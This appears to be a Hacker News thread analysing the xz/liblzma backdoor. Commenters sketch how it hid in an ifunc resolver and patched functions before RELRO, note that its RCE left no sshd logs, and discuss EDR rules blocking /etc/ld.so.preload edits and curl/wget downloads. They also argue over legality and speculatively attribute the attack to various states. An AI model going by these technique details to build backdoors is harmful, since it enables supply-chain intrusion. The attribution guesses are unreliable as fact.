[parent](#39898286) | [prev](#39899749) | [next](#39897562) [–]  > How many "process failures" are described in that process that exist in every OSS repo with volunteer unknown untrusted maintainers? What process failures actually happened here? What changes in process do you think would have stopped this? | | --- | --- | --- | | | |  |  | [matthew-wegner](user?id=matthew-wegner) [9 months ago](item?id=39897562)   | [root](#39896915) | [parent](#39897276) | [prev](#39897676) | [next](#39915398) [–]  "xz/liblzma: Bash-stage Obfuscation Explained" covers it well <https://gynvael.coldwind.pl/?lang=en&id=782> | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39915398)   | [root](#39896915) | [parent](#39897102) | [prev](#39897184) | [next](#39896972) [–]  There were several parts to it. For one, the control flow was non-standard, as the initial code hid itself into an ifunc for CPU capability resolution. From there it patched its own return address and branched into functions with plausible but misleading names that continued on to patch the table prior to RELRO kicking in. | | --- | --- | --- | | | |  |  | [jeffrallen](user?id=jeffrallen) [9 months ago](item?id=39896972)   | [parent](#39896915) | [prev](#39897012) | [next](#39896524) [–]  ifunc | | --- | --- | --- | | | |  |  | [mrob](user?id=mrob) [9 months ago](item?id=39896524)   | [prev](#39896915) | [next](#39896455) [–]  Do we know if this exploit only did something if a SSH connection was made? There's a list of strings from it on Github that includes "DISPLAY" and "WAYLAND\_DISPLAY": <https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01> These don't have any obvious connection to SSH, so maybe it did things even if there was no connection. This could be important to people who ran the code but never exposed their SSH server to the Internet, which some people seem to be assuming was safe. | | --- | --- | --- | | | |  |  | [rdtsc](user?id=rdtsc) [9 months ago](item?id=39896689)   | [parent](#39896524) | [next](#39896553) [–]  Those are probably kill switches to prevent the exploit from working if there is a terminal open or runs in a GUI session. In other words someone trying to detect, reproduce or debug it. | | --- | --- | --- | | | |  |  | [cma](user?id=cma) [9 months ago](item?id=39896553)   | [parent](#39896524) | [prev](#39896689) | [next](#39896455) [–]  Could that be related x11 session forwarding (common security hole on the connectors' side if they don't turn it off when connecting to an untrusted machine). | | --- | --- | --- | | | |  |  | [herpderperator](user?id=herpderperator) [9 months ago](item?id=39896455)   | [prev](#39896524) | [next](#39901869) [–]  > Note: successful exploitation does not generate any log entries. Does this mean, had this exploit gone unnoticed, the attacker could have executed arbitrary commands as root without even a single sshd log entry on the compromised host regarding the 'connection'? | | --- | --- | --- | | | |  |  | [sureglymop](user?id=sureglymop) [9 months ago](item?id=39896527)   | [parent](#39896455) | [next](#39896592) [–]  Yes.. The RCE happens at the connection stage before anything is logged. | | --- | --- | --- | | | |  |  | [udev4096](user?id=udev4096) [9 months ago](item?id=39897465)   | [root](#39896455) | [parent](#39896527) | [next](#39896592) [–]  That's insane. How exactly does this happen? Are there no EDR/IDS who can detect an RCE at the connection stage? | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39898966)   | [root](#39896455) | [parent](#39897465) | [next](#39903728) [–]  An IDS may detect something depending on what it is looking for. The grandparent is saying that sshd doesn't log anything. Which is not that surprising since sshd is atracker controlled. | | --- | --- | --- | | | |  |  | [gus\_](user?id=gus_) [9 months ago](item?id=39903728)   | [root](#39896455) | [parent](#39897465) | [prev](#39898966) | [next](#39915405) [–]  An EDR would have detected an inbound connection to port 22. Then it'd have detected the attacker's activity (opened files, executed commands, etc) If the EDR is capable of intercepting the forks, clone*() execves, open*(), etc, then you can follow the traces. If it's able to deny certain activity based on rules like modifying /etc/ld.so.preload or download files with curl/wget, it'd have made the attacker's life a bit more difficult. If the attacker loaded a rootkit, then probably you'd have lost visibility of what the attacker did after that. Also not all the EDRs hook all the functions, or they have bugs, so many times you are not able to follow a trace (without pain/guessing). This telemetry usually is sent to a remote server, so the attacker could not have deleted it. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39915405)   | [root](#39896455) | [parent](#39897465) | [prev](#39903728) | [next](#39896592) [–]  It is very difficult for EDR to detect something like this, because it would look like a SSH connection. | | --- | --- | --- | | | |  |  | [gitfan86](user?id=gitfan86) [9 months ago](item?id=39896592)   | [parent](#39896455) | [prev](#39896527) | [next](#39901869) [–]  Yeah, but then you would have ssh traffic without a matching login. Wonder if any anomaly detection would work on that | | --- | --- | --- | | | |  |  | [skykooler](user?id=skykooler) [9 months ago](item?id=39901328)   | [root](#39896455) | [parent](#39896592) | [next](#39897476) [–]  That would look the same as a random failed ssh login, which happens all the time. The connection isn't maintained past that point (unless the payload chooses to do so). | | --- | --- | --- | | | |  |  | [gitfan86](user?id=gitfan86) [9 months ago](item?id=39905344)   | [root](#39896455) | [parent](#39901328) | [next](#39897476) [–]  It would be similar but the payload is going to be abnormally large compared to other failed login attempts. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39915410)   | [root](#39896455) | [parent](#39905344) | [next](#39897476) [–]  Not if the attacker uses it just to gain an initial foothold and then extends their access through other means. | | --- | --- | --- | | | |  |  | [FergusArgyll](user?id=FergusArgyll) [9 months ago](item?id=39897476)   | [root](#39896455) | [parent](#39896592) | [prev](#39901328) | [next](#39901869) [–]  Interesting... Though you can edit whatever log file you want | | --- | --- | --- | | | |  |  | [jmb99](user?id=jmb99) [9 months ago](item?id=39898875)   | [root](#39896455) | [parent](#39897476) | [next](#39901869) [–]  Any log that root on that box has write access to. It’s theoretically possible to have an anomaly detection service running on a vulnerable machine dumping all of its’ data to an append-only service on some other non-compromised box. In that case, (in this ideal world) the attacker would not be able to disable the detection service before it had logged the anomalous traffic, and wouldn’t be able to purge those logs since they were on another machine. I’m not aware of any services that a) work like this, or b) would be able to detect this class of attack earlier than last week. If someone does though, please share. | | --- | --- | --- | | | |  |  | [fubar9463](user?id=fubar9463) [9 months ago](item?id=39899811)   | [root](#39896455) | [parent](#39898875) | [next](#39900335) [–]  You would be sending logs to a log collector (a SIEM) in security terms, and then you could join your firewall logs against your SSH auth logs. This kind of anomaly detection is possible. Not sure how common it is. I doubt it is common. | | --- | --- | --- | | | |  |  | [fubar9463](user?id=fubar9463) [9 months ago](item?id=39900334)   | [root](#39896455) | [parent](#39899811) | [next](#39900335) [–]  In any case the ROI for correlating SSH logs against network traffic is potentially error prone and may be more noisy than useful (can you differentiate in logs between SSH logins from a private IP and a public one?). An EDR tool would be much better to look for an attacker’s *next* steps. But if you’re trying to catch a nation state they probably already have a plan for hiding their tracks. | | --- | --- | --- | | | |  |  | [juitpykyk](user?id=juitpykyk) [9 months ago](item?id=39900335)   | [root](#39896455) | [parent](#39898875) | [prev](#39899811) | [next](#39901869) [–]  You can do it on a single machine if you use the TPM to create log hashes which can't be rolled back. | | --- | --- | --- | | | |  |  | [heeen2](user?id=heeen2) [9 months ago](item?id=39901869)   | [prev](#39896455) | [next](#39896664) [–]  I wonder if separating the test files out into their own repo, so that they would not have been available at build time could have made this harder. The reasoning being that anything available and this potentially involved in the build should be human readable. | | --- | --- | --- | | | |  |  | [Zuiii](user?id=Zuiii) [9 months ago](item?id=39902031)   | [parent](#39901869) | [next](#39896664) [–]  > Anything available and this potentially involved in the build should be human readable. That's actually a good principle to adopt overall. We should treat this attack like an air plane accident and adopt new rules that mitigate the chances of it being successfully carried out again. We might not be able to vet every single person who contributes, but we should be able to easily separate out noisy test data. | | --- | --- | --- | | | |  |  | [gghffguhvc](user?id=gghffguhvc) [9 months ago](item?id=39896664)   | [prev](#39901869) | [next](#39897091) [–]  Is there anything actually illegal here? Like is it a plausible “business” model for talented and morally compromised developers to do this and then sell the private key to state actors without actually breaking in themselves or allowing anyone else to break in. Edit: MIT license provides a pretty broad disclaimer to say it isn’t fit for any purpose implied or otherwise. | | --- | --- | --- | | | |  |  | [jcranmer](user?id=jcranmer) [9 months ago](item?id=39899057)   | [parent](#39896664) | [next](#39896926) [–]  There are things you can't contractually wave away, especially in form contracts that the other side has no ability to negotiate (which is what software licenses amount to). One of those things is going to be fraud: if the maintainer is intentionally installing backdoors into their software and not telling the user, there's going to be some fraud-like statute that they'll be liable for. | | --- | --- | --- | | | |  |  | [dannyw](user?id=dannyw) [9 months ago](item?id=39899942)   | [root](#39896664) | [parent](#39899057) | [next](#39896926) [–]  That said, if you’re doing this for your jurisdiction’s security agency, you’ll certainly be protected. | | --- | --- | --- | | | |  |  | [kstrauser](user?id=kstrauser) [9 months ago](item?id=39896926)   | [parent](#39896664) | [prev](#39899057) | [next](#39899963) [–]  Yes. This would surely be prosecutable under the CFAA. Honestly, if I were involved in this, I'd *hope* that it was, say, the FBI that caught me. I think that'd be the best chance of staying out of the Guantanamo Bay Hilton, laws be damned. | | --- | --- | --- | | | |  |  | [shp0ngle](user?id=shp0ngle) [9 months ago](item?id=39899149)   | [root](#39896664) | [parent](#39896926) | [next](#39897267) [–]  CIA didn't put anyone new into gitmo for years. The 30 remaining gitmo prisoners are all W Bush holdovers that all subsequent administrations forgot. | | --- | --- | --- | | | |  |  | [aftbit](user?id=aftbit) [9 months ago](item?id=39899647)   | [root](#39896664) | [parent](#39899149) | [next](#39899343) [–]  Sure but that's because the world knows about Gitmo now. What about the other quieter black sites? | | --- | --- | --- | | | |  |  | [kstrauser](user?id=kstrauser) [9 months ago](item?id=39899343)   | [root](#39896664) | [parent](#39899149) | [prev](#39899647) | [next](#39979512) [–]  Conspiracy theorist: *That's what they want you to believe.* And in fairness, the whole nature of their secrecy means there's no way to know for sure. It might be just a boogeyman kept around as a useful tool for scaring people into not breaking national security-level laws. I mean, it's not as though I want to go around hacking the planet, but the idea of ending up at a CIA "black site", assuming such things even exist, would be enough to keep me from trying it. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39979512)   | [root](#39896664) | [parent](#39899149) | [prev](#39899343) | [next](#39897267) [–]  "forgot" lmao | | --- | --- | --- | | | |  |  | [gghffguhvc](user?id=gghffguhvc) [9 months ago](item?id=39897267)   | [root](#39896664) | [parent](#39896926) | [prev](#39899149) | [next](#39899963) [–]  Even with the MIT disclaimer and the author not being the distributor or have any relationship with the distributor. Publishing vulnerable open source software to GitHub with a disclaimer that says it isn’t fit for any purpose seems like a bit of an oversight of using MIT license in distros to me. | | --- | --- | --- | | | |  |  | [gowld](user?id=gowld) [9 months ago](item?id=39898651)   | [root](#39896664) | [parent](#39897267) | [next](#39899028) [–]  A software license has never been a protection against malicious criminal activity. They'd have to prove that the "feature" had a legitimate non-nefarious purpose, or was accidental, neither of which apply here. | | --- | --- | --- | | | |  |  | [infamouscow](user?id=infamouscow) [9 months ago](item?id=39923558)   | [root](#39896664) | [parent](#39898651) | [next](#39899028) [–]  In the US, you are innocent until proven guilty. In the US, you are innocent until proven guilty. In the US, you are innocent until proven guilty. Apologies for having to be obnoxious about it, but it deserves repeating. If you take a approach of presumed guilty where the accused have to prove their innocence: you have a problem. You'd have a very difficult time proving your innocence after being accused of a crime. Anyone can accuse you of a murder that happened at 2am, and your alibi of being asleep won't cut it. Remember, in this bizarro world, it's presumed *you are already guilty*. You need to convince the prosector and jury you didn't commit the crime. Even if you had 4K night vision video of you sleeping in your bed, it probably won't persuade anyone because the prosecutor will say you pre-recorded the video to deceive a jury, and since you're presumed guilty, it makes sense for you to manufacture evidence in your defense. This is why guilty until proven innocent is genuinely stupid. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39979571)   | [root](#39896664) | [parent](#39923558) | [next](#39899028) [–]  Proven here is not in the same sense of a mathematical proof. "But your honor, technically you can't prove my client was going to use this exploit carefully hidden behind layers of obfuscation for malicious intent" is not a legal defense. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39899028)   | [root](#39896664) | [parent](#39897267) | [prev](#39898651) | [next](#39897440) [–]  That is not how disclaimers work. You cannot disclaim liability for intentionally harming someone. You also cannot avoid criminal charges for a crime simply by shouting "don't blame me" | | --- | --- | --- | | | |  |  | [gghffguhvc](user?id=gghffguhvc) [9 months ago](item?id=39902947)   | [root](#39896664) | [parent](#39899028) | [next](#39902561) [–]  I did setup the question in a way that the developer doesn’t harm someone themselves but sells it to a state actor. I.e extremely similar outcome to finding a zero day and selling it to a state actor except it is “more” secure - need private key. The point about MIT is that they are saying to the world when publishing “as is” folks. Not claiming I haven’t backdoored it for Uncle Sam.in fact I’m not claiming anything, use at your own risk. It used to be the law to implicitly do this by weak encryption for exports. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39917794)   | [root](#39896664) | [parent](#39902947) | [next](#39915422) [–]  > that the developer doesn’t harm someone themselves The harm in question is causing the backdoor to be inserted in the first place. Its irrelavent what else you do, like selling it, although that could be a separate crime. > The point about MIT is that they are saying to the world when publishing “as is” folks. Not claiming I haven’t backdoored it for Uncle Sam.in fact I’m not claiming anything, use at your own risk. Just because you think that is what those words mean, doesn't mean that is what those words actually mean. > It used to be the law to implicitly do this by weak encryption for exports. Not comparable. Even now, the MIT license would probably protect you from any consequenes of using super weak encryption. It would not protect you from the hypothetical you setup. They are very different sutuations. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39915422)   | [root](#39896664) | [parent](#39902947) | [prev](#39917794) | [next](#39902561) [–]  Selling to a state actor is also likely to be illegal depending on the conditions of the sale and who the buyer is. | | --- | --- | --- | | | |  |  | [seattle\_spring](user?id=seattle_spring) [9 months ago](item?id=39902561)   | [root](#39896664) | [parent](#39899028) | [prev](#39902947) | [next](#39899570) [–]  There's a great South Park episode about this, titled "Human CentiPad." Not for the squeamish. | | --- | --- | --- | | | |  |  | [kstrauser](user?id=kstrauser) [9 months ago](item?id=39899570)   | [root](#39896664) | [parent](#39899028) | [prev](#39902561) | [next](#39897440) [–]  That's exactly right. Imagine a license that said "...and I can come to your house and kill you if I want to." Even if someone signed it in ink and mailed a copy back, the licensor still can't go to their house and kill them even though the agreement says they can. I can imagine the case of maybe a "King of the Hill"-type game played on bare hardware, where you're actively trying to hack into and destroy other players' systems. Such a thing might have a license saying "you agree we may wipe your drive after downloading all your data", and that *might* be acceptable in that specific situation. You knew you were signing up for a risking endeavor that might harm your system. If/when it happens, you'd have a hard time complaining about it doing the thing it advertised that it would do. *Maybe.* Get a jury involved and who knows? But somewhere between those 2 examples is the xz case. There's no way a user of xz could think that it was designed to hack their system, and no amount of licensing can just wave that away. For a real world analogy, if you go skydiving, and you sign an injury against waiver, and you get hurt out of pure dumb luck and not negligence, good luck suing anyone for that. You jumped out of a plane. What did you think might happen? But if you walk into a McDonald's and fall through the floor into a basement and break your leg, no number of "not responsible for accidents" signs on the walls would keep them from being liable. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39899836)   | [root](#39896664) | [parent](#39899570) | [next](#39897440) [–]  > For a real world analogy, if you go skydiving, and you sign an injury against waiver, and you get hurt out of pure dumb luck and not negligence, good luck suing anyone for that. You jumped out of a plane. What did you think might happen? But if you walk into a McDonald's and fall through the floor into a basement and break your leg, no number of "not responsible for accidents" signs on the walls would keep them from being liable. Even this is a bad example, since it is just gross negligence and not intentional. A better analogy would be if mcdonalds shoots you. | | --- | --- | --- | | | |  |  | [kstrauser](user?id=kstrauser) [9 months ago](item?id=39900118)   | [root](#39896664) | [parent](#39899836) | [next](#39897440) [–]  I use to go to the In-N-Out in Oakland that just closed. That was a possibility, believe me. | | --- | --- | --- | | | |  |  | [gghffguhvc](user?id=gghffguhvc) [9 months ago](item?id=39897440)   | [root](#39896664) | [parent](#39897267) | [prev](#39899028) | [next](#39899963) [–]  THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39979607)   | [root](#39896664) | [parent](#39897440) | [next](#39899963) [–]  BY READING THIS COMMENT YOU AGREE THAT THE AUTHOR CAN TAKE ALL YOUR WORDLY POSSESSIONS. YOU ALSO INDEMNYFY THE AUTHOR FOR ANY HARM THEY MIGHT CAUSE YOU AT ANY TIME. I own you now. Sucks to be you I guess. Or maybe that's not how things work a) limits to what licenses can allow you to do and b) limits to who is bound by the license at all. | | --- | --- | --- | | | |  |  | [pama](user?id=pama) [9 months ago](item?id=39899963)   | [parent](#39896664) | [prev](#39896926) | [next](#39897050) [–]  You are talking about the greatest exposed hack of the computer supply chain so far by a big margin. Laws can be made retroactively for this type of thing. It has implications that are beyond the legal system, as the threat level is way beyond what is typically required as a sniff test for justifying military actions. This was not an RCE based on identifying negligent code; this was a carefully designed trap that could reverse the power dynamics during military conflict. | | --- | --- | --- | | | |  |  | [greyface-](user?id=greyface-) [9 months ago](item?id=39900020)   | [root](#39896664) | [parent](#39899963) | [next](#39897050) [–]  > Laws can be made retroactively Not in the United States. [https://constitution.congress.gov/browse/article-1/section-9...](https://constitution.congress.gov/browse/article-1/section-9/clause-3/) | | --- | --- | --- | | | |  |  | [int\_19h](user?id=int_19h) [9 months ago](item?id=39923928)   | [root](#39896664) | [parent](#39900020) | [next](#39900731) [–]  Ex post facto criminal liability is prohibited either constitutionally or by strong custom in most jurisdictions, and this is generally considered a fundamental part of having rule of law and due process. This is also spelled out in UDHR, ECHR, and several other similar documents. | | --- | --- | --- | | | |  |  | [pama](user?id=pama) [9 months ago](item?id=39926083)   | [root](#39896664) | [parent](#39923928) | [next](#39900731) [–]  Not sure it is worth spending any effort on this subject, however a ton of existing laws in almost any juristiction could be applied to this particular crime. I doubt the perpetrators would be caught, but I also doubt the punishment would be established via a legal system in a public setting anyways. Depending on what jurisdiction it is and who feels most compelled to punish them or not, it is possible they could be used as spies again for a different government. I wish I would be able to read the story behind the story eventually but I very much doubt it. The existence of a public key means there was in principle a way to verify the identity beyond doubt, though I don’t know how much longer this will be the case. | | --- | --- | --- | | | |  |  | [KeplerBoy](user?id=KeplerBoy) [9 months ago](item?id=39900731)   | [root](#39896664) | [parent](#39900020) | [prev](#39923928) | [next](#39897050) [–]  Meh, these are potentially the kind of crimes where laws don't apply. | | --- | --- | --- | | | |  |  | [alfanick](user?id=alfanick) [9 months ago](item?id=39897050)   | [parent](#39896664) | [prev](#39899963) | [next](#39902244) [–]  Legality things, depends on jurisdiction, which may or may not depend on: \* where were the authors of the code, \* where the code is stored, \* who is attacked, \* where are their servers, \* who is attacking, \* where are they based, \* where did they attack from, \* ... IANAL but it seems very complicated from law perspective (we, humanity, don't have a global law) Edit2: making a bullet point list is hard | | --- | --- | --- | | | |  |  | [db48x](user?id=db48x) [9 months ago](item?id=39902244)   | [parent](#39896664) | [prev](#39897050) | [next](#39901602) [–]  I’m no lawyer, but it is at minimum tortuous interference. | | --- | --- | --- | | | |  |  | [denton-scratch](user?id=denton-scratch) [9 months ago](item?id=39904188)   | [root](#39896664) | [parent](#39902244) | [next](#39901602) [–]  Indeed. I think a lawyer would have written "tortious", there being no pain involved. | | --- | --- | --- | | | |  |  | [db48x](user?id=db48x) [9 months ago](item?id=39908820)   | [root](#39896664) | [parent](#39904188) | [next](#39901602) [–]  Only the pain of spelling. | | --- | --- | --- | | | |  |  | [vikramkr](user?id=vikramkr) [9 months ago](item?id=39901602)   | [parent](#39896664) | [prev](#39902244) | [next](#39903090) [–]  Is there some weird loophole or something I'm missing here? Otherwise, I'm not exactly sure how hacking *wouldn't* be illegal. | | --- | --- | --- | | | |  |  | [greyface-](user?id=greyface-) [9 months ago](item?id=39901683)   | [root](#39896664) | [parent](#39901602) | [next](#39903090) [–]  Hacking statues cover unauthorized access, and there's no evidence that unauthorized access has occurred, unless we see someone actually making use of the backdoor in the wild. Accessing a system without authorization is a crime, but distributing code that contains a backdoor is not a crime. The attacker was authorized to publish changes to xz. | | --- | --- | --- | | | |  |  | [vikramkr](user?id=vikramkr) [9 months ago](item?id=39903059)   | [root](#39896664) | [parent](#39901683) | [next](#39903090) [–]  Do you have a source for the claim that this isn't a crime because it didn't succeed? As a sanity check, checking the plain text of the CFAA, it covers attempted hacking as you'd expect. So distributing a system with a backdoor, introducing a backdoor, etc all seem quite comfortably covered by existing statues. Which makes sense since like, I don't want to say 'duh' because I think that probably wouldn't meet HN guidelines for discourse but I'm not sure what else to say. Even American politicians, as notoriously incompetent as our leaders can be sometimes, wouldn't miss a crime *that* obvious. <https://www.law.cornell.edu/uscode/text/18/1030> | | --- | --- | --- | | | |  |  | [greyface-](user?id=greyface-) [9 months ago](item?id=39903361)   | [root](#39896664) | [parent](#39903059) | [next](#39903090) [–]  I'm not claiming the attempt didn't succeed. I'm claiming that the attempt didn't occur, and that distributing the backdoor more widely would only have created the preconditions for an attempt. We don't know who the intended target was, or what the intended payload was. Yes, subsection (b) of the CFAA covers attempts at acts described in subsection (a) of the CFAA. Which specific act under subsection (a) do you claim has been attempted? | | --- | --- | --- | | | |  |  | [vikramkr](user?id=vikramkr) [9 months ago](item?id=39906076)   | [root](#39896664) | [parent](#39903361) | [next](#39903090) [–]  All of them? It's a backdoor into Linux to gain unauthorized access to computers that even specifically only works for that attackers specific private key. We have trial by jury where I guess you could argue that this carefully crafted backdoor was just some sort weird accident, but we also have prosecutors to make the obvious counterargument and investigate what these folks were going for. Though frankly they're probably state actors that we're never gonna catch. But literally all of part a. I still don't understand if I'm actually just missing something obvious about our criminal justice system that would mean the US has no ability to prosecute even moderately complex crimes by slightly sophisticated actors that didn't reach fruition, since by your reasoning we'd also never be able to prosecute essentially any organized crime anywhere as long as they keep their targets a secret? If the attempt didn't occur then did someone just trip and fall on their keyboard over a period of months to accidentally carry out sophisticated social engineering to write a carefully hidden backdoor into a package targeted at hijacking widely used operating systems? | | --- | --- | --- | | | |  |  | [greyface-](user?id=greyface-) [9 months ago](item?id=39910653)   | [root](#39896664) | [parent](#39906076) | [next](#39903090) [–]  > All of them? > literally all of part a It's not (1) or (2) as no exfiltration has occurred. It's not (3) as a government system has not been targeted. It's not (4) as "the thing obtained consists only of the use of the computer". It's not (5) as no system has been targeted or damaged (based on the statutory definition of 'damage'). It's not (6) as we have no evidence of the attacker sharing their Ed448 private key. It's not (7) as there has been no act of extortion. > did someone just trip and fall on their keyboard over a period of months to accidentally carry out sophisticated social engineering to write a carefully hidden backdoor into a package targeted at hijacking widely used operating systems? I'm not arguing that it was a weird accident. I'm arguing that this clearly malicious act does not, based solely on the information we have today, constitute a violation of the CFAA. | | --- | --- | --- | | | |  |  | [vikramkr](user?id=vikramkr) [9 months ago](item?id=39903090)   | [parent](#39896664) | [prev](#39901602) | [next](#39899264) [–]  As a sanity check, attempted crime is still crime, so not a lawyer but part B isn't exactly ambiguous here: <https://www.law.cornell.edu/uscode/text/18/1030> In terms of a plausible business model - I mean that's conspiracy to commit crime, like of course that's illegal? And depending on the state actor and the target system - literally treason if it's a cyber attack as a part of a war? You can put whatever you want into a license or contract but obviously that doesn't let you override the actual law | | --- | --- | --- | | | |  |  | [greyface-](user?id=greyface-) [9 months ago](item?id=39899264)   | [parent](#39896664) | [prev](#39903090) | [next](#39897091) [–]  I brought this up in an earlier thread and got heavily downvoted. <https://news.ycombinator.com/item?id=39878227> | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39915436)   | [root](#39896664) | [parent](#39899264) | [next](#39897091) [–]  I don't think you should have been downvoted, but it's pretty clear that this would be a crime. | | --- | --- | --- | | | |  |  | [declan\_roberts](user?id=declan_roberts) [9 months ago](item?id=39897091)   | [prev](#39896664) | [next](#39896409) [–]  One thing I notice about state-level espionage and backdoors. The USA seems to have an affinity for hardware interdiction as opposed to software backdoors. Hardware backdoors make sense since much of it passes through the USA. Other countries such as Israel are playing the long-con with very well engineered, multi-year software backdoors. A much harder game to play. | | --- | --- | --- | | | |  |  | [croemer](user?id=croemer) [9 months ago](item?id=39900477)   | [parent](#39897091) | [next](#39898851) [–]  Jia Tan's GitHub activity was mostly 10-18@UTC, consistent with Europe/Israel/Russia | | --- | --- | --- | | | |  |  | [jeroenhd](user?id=jeroenhd) [9 months ago](item?id=39901005)   | [root](#39897091) | [parent](#39900477) | [next](#39901124) [–]  It's rather trivial to fake git commits. Basing this stuff on email times (especially replies to emails sent that same day) would be more relevant. However. if this operation was pulled off with the precision and opsec that it seems to have been, I wouldn't be too surprised if whatever group is behind this attack would've sent over + funded a developer somewhere in a time zone of their choice. No doubt any nation state is able to station someone in Russia/Israel/one of the n-eyes countries. I doubt OSINT will figure out who is really behind this, but I'm sure governments will, soon enough. Whether or not they report the truth of their findings, and if one should trust the official reporting, is yet another tough question. | | --- | --- | --- | | | |  |  | [croemer](user?id=croemer) [9 months ago](item?id=39905215)   | [root](#39897091) | [parent](#39901005) | [next](#39902308) [–]  I'm basing this on Github's activity archive as queried through Clickhouse - which is much harder to fake than git commits: [https://play.clickhouse.com/play?user=play#U0VMRUNUCiAgY3JlY...](https://play.clickhouse.com/play?user=play#U0VMRUNUCiAgY3JlYXRlZF9hdCwKICBhY3Rvcl9sb2dpbiwKICByZXBvX25hbWUsCiAgZXZlbnRfdHlwZSwKICB0aXRsZQpGUk9NCiAgZ2l0aHViX2V2ZW50cwpXSEVSRQogIGFjdG9yX2xvZ2luID0gJ0ppYVQ3NScKT1JERVIgQlkKICBjcmVhdGVkX2F0IERFU0MK) See the writeup here: <https://til.simonwillison.net/clickhouse/github-explorer> | | --- | --- | --- | | | |  |  | [McBun](user?id=McBun) [9 months ago](item?id=39921999)   | [root](#39897091) | [parent](#39905215) | [next](#39902308) [–]  Thank you for this tool. That activity look 100% to be from a paid employee to me. He works in the morning and does git maintenance in the afternoon like clockwork... Between 12 and 18... It might also have been multiple employee. He didn't work on Christmas or new year eve which is extremely telling... | | --- | --- | --- | | | |  |  | [int\_19h](user?id=int_19h) [9 months ago](item?id=39923996)   | [root](#39897091) | [parent](#39921999) | [next](#39902308) [–]  The last commit in December is on the 21st, so I'm not sure how much can be read into it. But note that he comes back next year on the 5th, then disappears for 6th and 7th, and comes back at 8th. 7th is the old-style Eastern Orthodox Christmas, as celebrated in e.g. Russia, Serbia, and Georgia, and 6th is therefore the Christmas Eve. Although in Russia official holidays are the entire week from January, 1 to January, 8 inclusive... still, for this kind of work I wouldn't expect them to stick to the letter of the law there. | | --- | --- | --- | | | |  |  | [db48x](user?id=db48x) [9 months ago](item?id=39902308)   | [root](#39897091) | [parent](#39901005) | [prev](#39905215) | [next](#39901124) [–]  The git timestamps in the git commits probably were faked, but they implicate China. There were a handful of apparent slippups though, and if we take those timestamps to be correct then it looks like they were in eastern Europe (or possibly Finland, the Baltics, or the Mediterranean coast all the way down to Egypt). And if we instead assume that these timestamps are a second–level misdirection then there is a huge complexity penalty; my money is on the simpler answer (but not all my money; it’s not a sure bet). | | --- | --- | --- | | | |  |  | [Culonavirus](user?id=Culonavirus) [9 months ago](item?id=39901124)   | [root](#39897091) | [parent](#39900477) | [prev](#39901005) | [next](#39902498) [–]  I like to think that the performance issue in the exploit was actually an exploit of an exploit, a counterintelligence act, by some "good samaritan" :D | | --- | --- | --- | | | |  |  | [klabb3](user?id=klabb3) [9 months ago](item?id=39902498)   | [root](#39897091) | [parent](#39900477) | [prev](#39901124) | [next](#39898851) [–]  Thanks, i was wondering about this since day 0 and was too lazy to look it up. Yes it can be spoofed, but I imagine a good chunk of day-to-day is work is semi-interactive, which would make it preferable to have the attacker be in the same tz as the victims. Anyone know what tz Lasse was at? If not (eg he’s in the US), then I’d say Occam’s razor that the attacker is working those UTC 10-18 office hours without extra steps. Tz proves nothing and for a 3y low-intensity operation I’d just assume the attacker won’t introduce that much friction only to mislead. I’m sure there are much stronger signals in the investigation work that’s going on now. Unfortunately, given the hush-hush-by-default nature of our beloved intel agencies, we’ll probably never know. | | --- | --- | --- | | | |  |  | [croemer](user?id=croemer) [9 months ago](item?id=39905430)   | [root](#39897091) | [parent](#39902498) | [next](#39905402) [–]  Here you can see Larzhu's activity by time of day, looks much more natural than JiaT75's: [https://play.clickhouse.com/play?user=play#U0VMRUNUCiBmb3JtY...](https://play.clickhouse.com/play?user=play#U0VMRUNUCiBmb3JtYXREYXRlVGltZSh0b1N0YXJ0T2ZIb3VyKGNyZWF0ZWRfYXQpLCAnJUg6JWknKSBBUyBob3VyX3N0YXJ0LAogYWN0b3JfbG9naW4sCiBDT1VOVCgqKSBBUyBldmVudF9jb3VudApGUk9NCiBnaXRodWJfZXZlbnRzCldIRVJFCiBhY3Rvcl9sb2dpbiA9ICdMYXJoenUnCkdST1VQIEJZCiBob3VyX3N0YXJ0LAogYWN0b3JfbG9naW4KT1JERVIgQlkKIGhvdXJfc3RhcnQgQVND) | | --- | --- | --- | | | |  |  | [croemer](user?id=croemer) [9 months ago](item?id=39905402)   | [root](#39897091) | [parent](#39902498) | [prev](#39905430) | [next](#39898851) [–]  I don't think Github activity logs can be spoofed - of course activity can consciously been done in a certain time zone, but that's different from spoofing timestamps in git commits. See <https://news.ycombinator.com/edit?id=39905376> for the full histogram, it shows a rather narrow time distribution between 12-16 UTC - not really natural at all if you ask me. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39898851)   | [parent](#39897091) | [prev](#39900477) | [next](#39897316) [–]  > Other countries such as Israel are playing the long-con with very well engineered, multi-year software backdoors What is this in reference to? | | --- | --- | --- | | | |  |  | [Voultapher](user?id=Voultapher) [9 months ago](item?id=39899253)   | [root](#39897091) | [parent](#39898851) 